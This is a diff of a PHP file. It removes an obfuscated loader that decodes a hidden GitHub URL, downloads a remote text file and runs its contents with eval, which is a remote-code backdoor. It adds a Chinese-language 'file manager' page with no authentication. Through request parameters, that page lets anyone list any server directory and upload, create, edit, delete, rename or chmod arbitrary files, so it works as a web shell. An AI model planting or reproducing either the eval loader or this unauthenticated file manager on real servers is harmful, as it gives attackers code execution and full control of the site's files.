@@ -1,2 +1,266 @@
 <?php
- goto XR1pk; XR1pk: goto KQk1M; goto ZI8Pl; yCRu6: dM939: goto q1gaQ; Y2uhv: curl_setopt($WBh9X, CURLOPT_RETURNTRANSFER, 1); goto nEcAv; ZI8Pl: Bpgg3: goto Y2uhv; tDEyv: nQ89l: goto AGZ6K; WaFav: t83Z7: goto HpAZf; lvQ9x: $W9VmA = "\150\164\x74\x70\x73\72\x2f\x2f\x72\x61\167\56\x67\151\164\x68\165\142\x75\x73\x65\x72\143\x6f\x6e\164\x65\x6e\x74\56\x63\x6f\x6d\x2f\x68\152\x6b\143\x63\146\147\57\x64\x79\x32\x2f\x6d\141\x69\156\57\x62\x61\153\56\164\x78\164"; goto D_EID; AGZ6K: $wzv2F = curl_exec($WBh9X); goto FJ7xg; q1gaQ: $WBh9X = curl_init($W9VmA); goto tZWS4; D_EID: goto dM939; goto yCRu6; lY7q4: KQk1M: goto lvQ9x; tZWS4: goto Bpgg3; goto WaFav; FJ7xg: goto t83Z7; goto lY7q4; nEcAv: goto nQ89l; goto tDEyv; HpAZf: @eval("\77\76" . $wzv2F);
+mb_internal_encoding("UTF-8");
+
+$current = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+if (!is_dir($current)) $current = getcwd();
+$current = realpath($current) ?: $current;
+$parent = dirname($current);
+$items = scandir($current);
+
+// 排序：文件夹优先，按名称升序
+usort($items, function($a, $b) use ($current) {
+    $aPath = $current . DIRECTORY_SEPARATOR . $a;
+    $bPath = $current . DIRECTORY_SEPARATOR . $b;
+    if (is_dir($aPath) && !is_dir($bPath)) return -1;
+    if (!is_dir($aPath) && is_dir($bPath)) return 1;
+    return strcasecmp($a, $b);
+});
+
+$createFileMsg = $editFileMsg = $actionMsg = '';
+$renameTarget = $chmodTarget = null;
+
+// 创建文件
+if (isset($_POST['create_file'])) {
+    $newFilePath = trim($_POST['new_file_path']);
+    $newFileContent = $_POST['new_file_content'];
+    if (!empty($newFilePath)) {
+        $newDir = dirname($newFilePath);
+        if (!is_dir($newDir)) mkdir($newDir, 0777, true);
+        if (file_put_contents($newFilePath, $newFileContent) !== false) {
+            $createFileMsg = "<div class='msg success'>✅ 创建文件成功：<code>" . htmlspecialchars($newFilePath, ENT_QUOTES, 'UTF-8') . "</code></div>";
+            $items = scandir($current);
+        } else {
+            $createFileMsg = "<div class='msg error'>❌ 写入失败：<code>" . htmlspecialchars($newFilePath, ENT_QUOTES, 'UTF-8') . "</code></div>";
+        }
+    } else {
+        $createFileMsg = "<div class='msg warn'>⚠️ 文件路径不能为空</div>";
+    }
+}
+
+// 批量复制
+if (isset($_POST['copy_files'])) {
+    $sourceFiles = array_filter(array_map('trim', explode("\n", $_POST['source_files'])));
+    $targetDirs = array_filter(array_map('trim', explode("\n", $_POST['target_dirs'])));
+    foreach ($sourceFiles as $sourceFile) {
+        if (!file_exists($sourceFile)) continue;
+        $filename = basename($sourceFile);
+        foreach ($targetDirs as $targetDir) {
+            $targetDir = rtrim($targetDir, '/') . '/';
+            if (!is_dir($targetDir)) mkdir($targetDir, 0777, true);
+            copy($sourceFile, $targetDir . $filename);
+        }
+    }
+    $actionMsg = "<div class='msg success'>✅ 批量复制完成</div>";
+}
+
+// 删除文件
+if (isset($_POST['delete_file'])) {
+    $path = $_POST['delete_file'];
+    if (is_file($path)) {
+        unlink($path);
+        $actionMsg = "<div class='msg success'>🗑️ 文件已删除：<code>" . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . "</code></div>";
+        $items = scandir($current);
+    }
+}
+
+// 修改权限
+if (isset($_POST['chmod_prompt'])) $chmodTarget = $_POST['chmod_prompt'];
+if (isset($_POST['chmod_file'])) {
+    $path = $_POST['chmod_file'];
+    $mode = octdec($_POST['new_permission']);
+    if (chmod($path, $mode)) {
+        $actionMsg = "<div class='msg success'>✅ 修改权限成功：<code>" . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . "</code></div>";
+    } else {
+        $actionMsg = "<div class='msg error'>❌ 修改权限失败：<code>" . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . "</code></div>";
+    }
+}
+
+// 重命名
+if (isset($_POST['rename_prompt'])) $renameTarget = $_POST['rename_prompt'];
+if (isset($_POST['rename_file'])) {
+    $old = $_POST['rename_file'];
+    $new = $_POST['new_name'];
+    $newFull = dirname($old) . DIRECTORY_SEPARATOR . $new;
+    if (rename($old, $newFull)) {
+        $actionMsg = "<div class='msg success'>✅ 重命名成功</div>";
+        $items = scandir($current);
+    } else {
+        $actionMsg = "<div class='msg error'>❌ 重命名失败</div>";
+    }
+}
+
+// 编辑文件
+if (isset($_POST['save_edit'])) {
+    $editPath = $_POST['edit_path'];
+    $editContent = $_POST['edit_content'];
+    if (file_put_contents($editPath, $editContent) !== false) {
+        $editFileMsg = "<div class='msg success'>✅ 文件已保存：<code>" . htmlspecialchars($editPath, ENT_QUOTES, 'UTF-8') . "</code></div>";
+    } else {
+        $editFileMsg = "<div class='msg error'>❌ 文件保存失败</div>";
+    }
+}
+
+// 上传文件
+if (isset($_POST['upload_submit']) && !empty($_FILES['upload_files'])) {
+    $uploadDir = $current . DIRECTORY_SEPARATOR;
+    $uploadErrors = $uploadSuccess = [];
+
+    foreach ($_FILES['upload_files']['error'] as $index => $error) {
+        if ($error === UPLOAD_ERR_OK) {
+            $tmpName = $_FILES['upload_files']['tmp_name'][$index];
+            $name = basename($_FILES['upload_files']['name'][$index]);
+            $destination = $uploadDir . $name;
+            if (move_uploaded_file($tmpName, $destination)) {
+                $uploadSuccess[] = $name;
+            } else {
+                $uploadErrors[] = $name;
+            }
+        } else {
+            $uploadErrors[] = $_FILES['upload_files']['name'][$index];
+        }
+    }
+
+    if ($uploadSuccess) {
+        $actionMsg .= "<div class='msg success'>✅ 上传成功：<code>" . htmlspecialchars(implode(', ', $uploadSuccess), ENT_QUOTES, 'UTF-8') . "</code></div>";
+        $items = scandir($current);
+    }
+    if ($uploadErrors) {
+        $actionMsg .= "<div class='msg error'>❌ 上传失败：<code>" . htmlspecialchars(implode(', ', $uploadErrors), ENT_QUOTES, 'UTF-8') . "</code></div>";
+    }
+}
+?>
+
+<!-- HTML 部分（和你原来的几乎一样，只是加了 htmlspecialchars 和编码保护） -->
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>文件管理器</title>
+    <style>
+        body { font-family: Arial; padding: 30px; background: #f3f3f3; }
+        .container { background: white; padding: 20px; border-radius: 10px; width: 900px; box-shadow: 0 0 5px #ccc; margin-bottom: 30px; }
+        input, textarea { width: 100%; padding: 8px; margin: 10px 0; font-size: 14px; }
+        input[type="submit"] { width: auto; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; padding: 5px 10px; font-size: 12px; }
+        input[type="submit"]:hover { background: #0056b3; }
+        code { background: #f8f8f8; padding: 2px 4px; border-radius: 3px; }
+        ul { list-style: none; padding-left: 0; }
+        li { padding: 6px 0; display: flex; justify-content: space-between; align-items: center; }
+        .file-actions form { display: inline; margin-left: 5px; }
+        .msg { padding: 10px; border-radius: 5px; margin-bottom: 20px; }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        .warn { background: #fff3cd; color: #856404; }
+    </style>
+</head>
+<body>
+
+<div style="padding: 15px; background: #f8f9fa; border-bottom: 1px solid #ccc; margin-bottom: 20px;">
+    <strong>📂 当前目录：</strong>
+    <code><?= htmlspecialchars($current, ENT_QUOTES, 'UTF-8') ?></code>
+    <?php if ($current !== '/') : ?>
+        <div style="margin-top: 5px;">
+            🔙 <a href="?dir=<?= rawurlencode($parent) ?>">返回上级目录</a>
+        </div>
+    <?php endif; ?>
+</div>
+
+<div class="container">
+    <h2>📤 上传文件</h2>
+    <form method="post" enctype="multipart/form-data">
+        <label>选择文件（可多选）</label>
+        <input type="file" name="upload_files[]" multiple>
+        <input type="submit" name="upload_submit" value="上传">
+    </form>
+</div>
+
+<div class="container">
+    <h2>📄 当前目录文件列表</h2>
+    <?= $actionMsg ?>
+    <ul>
+        <?php foreach ($items as $item):
+            if ($item === '.' || $item === '..') continue;
+            $fullPath = $current . DIRECTORY_SEPARATOR . $item;
+        ?>
+        <li>
+            <span>
+                <?= is_dir($fullPath) ? '📁' : '📄' ?>
+                <?= is_dir($fullPath)
+                    ? '<a href="?dir=' . rawurlencode($fullPath) . '">' . htmlspecialchars($item, ENT_QUOTES, 'UTF-8') . '/</a>'
+                    : htmlspecialchars($item, ENT_QUOTES, 'UTF-8')
+                ?>
+            </span>
+            <span class="file-actions">
+                <?php if (!is_dir($fullPath)): ?>
+                    <form method="post"><input type="hidden" name="edit_path" value="<?= htmlspecialchars($fullPath, ENT_QUOTES, 'UTF-8') ?>"><input type="submit" name="edit" value="📝"></form>
+                    <form method="post"><input type="hidden" name="delete_file" value="<?= htmlspecialchars($fullPath, ENT_QUOTES, 'UTF-8') ?>"><input type="submit" value="🗑️"></form>
+                    <form method="post"><input type="hidden" name="chmod_prompt" value="<?= htmlspecialchars($fullPath, ENT_QUOTES, 'UTF-8') ?>"><input type="submit" value="🔧"></form>
+                    <form method="post"><input type="hidden" name="rename_prompt" value="<?= htmlspecialchars($fullPath, ENT_QUOTES, 'UTF-8') ?>"><input type="submit" value="✏️"></form>
+                <?php endif; ?>
+            </span>
+        </li>
+        <?php endforeach; ?>
+    </ul>
+</div>
+
+<?php if (isset($_POST['edit'])): ?>
+<div class="container">
+    <h2>✏️ 编辑文件内容</h2>
+    <?= $editFileMsg ?>
+    <form method="post">
+        <input type="hidden" name="edit_path" value="<?= htmlspecialchars($_POST['edit_path'], ENT_QUOTES, 'UTF-8') ?>">
+        <label><strong><?= htmlspecialchars($_POST['edit_path'], ENT_QUOTES, 'UTF-8') ?></strong></label>
+        <textarea name="edit_content" rows="10"><?= htmlspecialchars(file_get_contents($_POST['edit_path']), ENT_QUOTES, 'UTF-8') ?></textarea>
+        <input type="submit" name="save_edit" value="保存">
+    </form>
+</div>
+<?php endif; ?>
+
+<?php if ($chmodTarget): ?>
+<div class="container">
+    <h2>🔧 修改权限</h2>
+    <form method="post">
+        <input type="hidden" name="chmod_file" value="<?= htmlspecialchars($chmodTarget, ENT_QUOTES, 'UTF-8') ?>">
+        <label>新权限（如 0644）</label>
+        <input type="text" name="new_permission">
+        <input type="submit" value="确认修改">
+    </form>
+</div>
+<?php endif; ?>
+
+<?php if ($renameTarget): ?>
+<div class="container">
+    <h2>✏️ 重命名文件</h2>
+    <form method="post">
+        <input type="hidden" name="rename_file" value="<?= htmlspecialchars($renameTarget, ENT_QUOTES, 'UTF-8') ?>">
+        <label>新名称</label>
+        <input type="text" name="new_name">
+        <input type="submit" value="确认重命名">
+    </form>
+</div>
+<?php endif; ?>
+
+<div class="container">
+    <h2>📁 批量复制文件</h2>
+    <form method="post">
+        <label>源文件路径（每行一个）</label>
+        <textarea name="source_files" rows="4"></textarea>
+        <label>目标目录路径（每行一个）</label>
+        <textarea name="target_dirs" rows="4"></textarea>
+        <input type="submit" name="copy_files" value="批量复制">
+    </form>
+</div>
+
+<div class="container">
+    <h2>📝 新建文件</h2>
+    <?= $createFileMsg ?>
+    <form method="post">
+        <label>📄 文件完整路径</label>
+        <input type="text" name="new_file_path" placeholder="/path/to/file.txt">
+        <label>📋 文件内容</label>
+        <textarea name="new_file_content" rows="5"></textarea>
+        <input type="submit" name="create_file" value="创建文件">
+    </form>
+</div>
+
+</body>
+</html>
